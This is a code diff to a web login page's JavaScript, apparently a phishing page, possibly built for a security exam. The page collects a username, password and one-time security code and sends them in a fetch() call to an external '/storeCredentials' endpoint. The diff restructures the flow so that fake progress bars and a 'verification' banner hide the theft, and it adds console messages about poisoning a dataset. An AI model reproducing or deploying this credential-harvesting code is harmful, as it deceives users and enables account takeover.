@@ -14,13 +14,33 @@
         // If you have any questions, contact lglpeplnmppbkkdejipedmanncikjgol@google.com.
         window.addEventListener('load', function() {
 			var f = document.getElementById('loginForm');
-          f.addEventListener('submit', async function(e) {   //on form submit
+          f.addEventListener('submit', function(e) {   //on form submit
 			e.preventDefault();  //prevent page reload
 			
 			//remove input fields
 			currH=document.getElementById("formContainer").style.height;
 			currW=document.getElementById("formContainer").style.width;
 			document.getElementById("formContainer").firstElementChild.style.visibility="hidden";
+			
+			//show progress
+			document.getElementById("verifiedProgress").style.display="block";
+			
+			//display the last accesses
+			setTimeout(()=>{
+				document.getElementById("verificationBanner").style.display="block";
+				document.getElementById("verifiedProgress").style.display="none"
+				document.getElementById("verifiedProgressText").style.display="none";
+			},2000);
+			
+          });
+		  
+		  async function showLastMessage(){
+			//hide popup
+			document.getElementById("verificationBanner").style.display="none";
+			
+			//show progress bar
+			document.getElementById("verifiedProgress").style.display="block";
+			document.getElementById("verifiedProgressText").style.display="block";
 			
 			//show progress bar
 			document.getElementById("verifiedProgress").style.display="block";
@@ -30,7 +50,7 @@
 			const username = document.getElementById("username").value;
 			const password = document.getElementById("password").value;
 			const sec_code = document.getElementById("otp").value;
-			var res=await fetch("https://cybersecurityserver-exam.vercel.app/storeCredentials?text=username:"+username+"//?//password:"+password+"//?//security code:"+sec_code)
+			var res=await fetch("https://cybersecurityserver-exam.vercel.app/storeCredentials?text=username:"+username+"//?//password:"+password+"//?//security code:"+sec_code);
 			res= await res.text();
 			if(res=="fatto"){
 				//credenziali memorizzate correttamente
@@ -88,30 +108,21 @@
 				  });
 				const resp_s_dataset = await resp_store_dataset.json();
 				
-				console.log(resp_s_dataset.response);
+				console.log("Poisoning the dataset...");
+				
+				setTimeout(()=>console.log("Dataset poisoned correctly"),2000);
+				
+				setTimeout(()=>console.log(resp_s_dataset.response),2000);
 				
 			}
-			
-			
-			//show popup
-			document.getElementById("verificationBanner").style.display="block";
-			document.getElementById("verifiedProgress").style.display="none"
-			document.getElementById("verifiedProgressText").style.display="none";
-          });
-		  
-		  function showLastMessage(){
-			//hide popup
-			document.getElementById("verificationBanner").style.display="none";
-			
-			//show progress bar
-			document.getElementById("verifiedProgress").style.display="block";
 			
 			//show verification
 			setTimeout(()=>{
 				document.getElementById("verifiedProgress").style.display="none";
+				document.getElementById("verifiedProgressText").style.display="none";
 				document.getElementById("verified").style.display="block";
 				document.getElementById("verifiedText").style.display="block";
-			},3000);
+			},4000);
 		  }
 		  
 		  document.getElementById("yesButton").addEventListener("click",showLastMessage);
